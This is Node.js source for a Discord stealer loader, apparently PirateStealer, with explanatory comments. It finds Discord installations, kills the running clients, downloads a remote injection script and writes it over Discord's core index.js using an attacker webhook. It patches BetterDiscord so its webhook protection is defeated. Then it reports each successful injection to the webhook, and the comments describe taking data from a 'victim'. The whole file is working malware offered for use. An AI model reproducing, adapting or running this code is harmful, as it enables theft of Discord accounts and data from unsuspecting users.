var glob = require("glob");
//glob is used for file matching, by using patterns used by the shell
//src: https://www.npmjs.com/package/glob

const fs = require("fs");
//Used for file io

const https = require("https");

const { exec } = require("child_process");
//child_process provides modules for creating sub processes. basically runs shell commands
//exec will be used to spawn a shell and run commands in the shell

const axios = require("axios");
//Axios is a promised based api for sending Http requests
//src = https://www.npmjs.com/package/axios

const buf_replace = require("buffer-replace");
//it replaces all occurences of a string with another string in a buffer
//src = https://www.npmjs.com/package/buffer-replace

const hook = "da_webhook";
//This is where u put in your webhook. After getting the client data you want from a victim's discord
//your webhook will send the data over to you on discord

const config = {
  logout: "%LOGOUT%1",
  "inject-notify": "%INJECTNOTI%1",
  "logout-notify": "%LOGOUTNOTI%1",
  "init-notify": "%INITNOTI%1",
  "embed-color": "%MBEDCOLOR%1",
  "disable-qr-code": "%DISABLEQRCODE%1",
};
//TODO: Config parameters, i don't know what they are used for yet

var LOCAL = process.env.LOCALAPPDATA;
var discords = [];
var injectPath = [];
var runningDiscords = [];
fs.readdirSync(LOCAL).forEach((file) => {
  if (file.includes("iscord")) {
    discords.push(LOCAL + "\\" + file);
  } else {
    return;
  }
});
discords.forEach(function (file) {
  let pattern =
    `${file}` +
    "\\app-*\\modules\\discord_desktop_core-*\\discord_desktop_core\\index.js";
  glob.sync(pattern).map((file) => {
    injectPath.push(file);
  });
});
listDiscords();
function Infect() {
  https
    .get(
      "https://raw.githubusercontent.com/PirateMonster/PirateStealer/main/src/injection/injection.js",
      (resp) => {
        let data = "";
        resp.on("data", (chunk) => {
          data += chunk;
        });
        resp.on("end", () => {
          injectPath.forEach((file) => {
            fs.writeFileSync(
              file,
              data
                .replace("%WEBHOOK_LINK%", hook)
                .replace("%INITNOTI%", config["init-notify"])
                .replace("%LOGOUT%", config.logout)
                .replace("%LOGOUTNOTI%", config["logout-notify"])
                .replace("3447704", config["embed-color"])
                .replace("%DISABLEQRCODE%", config["disable-qr-code"]),
              {
                encoding: "utf8",
                flag: "w",
              }
            );
            if (config["init-notify"] == "true") {
              let init = file.replace("index.js", "init");
              if (!fs.existsSync(init)) {
                fs.mkdirSync(init, 0744);
              }
            }
            if (config.logout != "false") {
              let folder = file.replace("index.js", "PirateStealerBTW");
              if (!fs.existsSync(folder)) {
                fs.mkdirSync(folder, 0744);
                if (config.logout == "instant") {
                  startDiscord();
                }
              } else if (fs.existsSync(folder) && config.logout == "instant") {
                startDiscord();
              }
            }
          });
        });
      }
    )
    .on("error", (err) => {
      console.log(err);
    });
}
function listDiscords() {
  exec("tasklist", function (err, stdout, stderr) {
    if (stdout.includes("Discord.exe")) {
      runningDiscords.push("discord");
    }
    if (stdout.includes("DiscordCanary.exe")) {
      runningDiscords.push("discordcanary");
    }
    if (stdout.includes("DiscordDevelopment.exe")) {
      runningDiscords.push("discorddevelopment");
    }
    if (stdout.includes("DiscordPTB.exe")) {
      runningDiscords.push("discordptb");
    }
    if (config.logout == "instant") {
      killDiscord();
    } else {
      if (config["inject-notify"] == "true" && injectPath.length != 0) {
        injectNotify();
      }
      Infect();
      pwnBetterDiscord();
    }
  });
}
function killDiscord() {
  runningDiscords.forEach((disc) => {
    exec(`taskkill /IM ${disc}.exe /F`, (err) => {
      if (err) {
        return;
      }
    });
  });
  if (config["inject-notify"] == "true" && injectPath.length != 0) {
    injectNotify();
  }
  Infect();
  pwnBetterDiscord();
}
function startDiscord() {
  runningDiscords.forEach((disc) => {
    let path =
      LOCAL + "\\" + disc + "\\Update.exe --processStart " + disc + ".exe";
    exec(path, (err) => {
      if (err) {
        return;
      }
    });
  });
}
function pwnBetterDiscord() {
  // thx stanley
  var dir = process.env.appdata + "\\BetterDiscord\\data\\betterdiscord.asar";
  if (fs.existsSync(dir)) {
    var x = fs.readFileSync(dir);
    fs.writeFileSync(dir, buf_replace(x, "api/webhooks", "stanleyisgod"));
  } else {
    return;
  }
}
function injectNotify() {
  var fields = [];
  injectPath.forEach((path) => {
    var c = {
      name: ":syringe: Inject Path",
      value: `\`\`\`${path}\`\`\``,
      inline: !1,
    };
    fields.push(c);
  });
  axios
    .post(hook, {
      content: null,
      embeds: [
        {
          title: ":detective: Successfull injection",
          color: config["embed-color"],
          fields: fields,
          author: {
            name: "PirateStealer",
          },
          footer: {
            text: "PirateStealer",
          },
        },
      ],
    })
    .then((res) => {})
    .catch((error) => {});
}
